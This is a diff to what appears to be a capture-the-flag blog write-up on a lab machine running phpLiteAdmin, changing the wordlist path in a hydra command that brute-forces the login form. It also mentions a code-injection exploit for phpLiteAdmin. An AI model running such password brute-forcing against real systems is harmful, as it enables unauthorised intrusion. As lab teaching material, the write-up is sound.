@@ -183,7 +183,7 @@ The script will store the sqlite database in the same directory as phpliteadmin.
 Fortunately for me I've encountered same exploit once already in one of my other blogs - [zico2](https://v3ded.github.io/ctf/zico2.html). It's a lengthy process of creating a database which is then miss-translated into php code that gets executed on a target server. But for all of this to work we need to be authenticated first! Fire our good old hydra again :-).
 
 ```console
-root@EdgeOfNight:~# hydra 10.10.10.43 -l whatever -P /usr/share/wordlists/rockyou.txt.gz https-post-form "/db/:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -V -s 443
+root@EdgeOfNight:~# hydra 10.10.10.43 -l whatever -P /usr/share/wordlists/rockyou.txt https-post-form "/db/:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -V -s 443
 
 Hydra v8.5 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 Hydra (http://www.thc.org/thc-hydra) starting at 2017-12-16 07:35:48
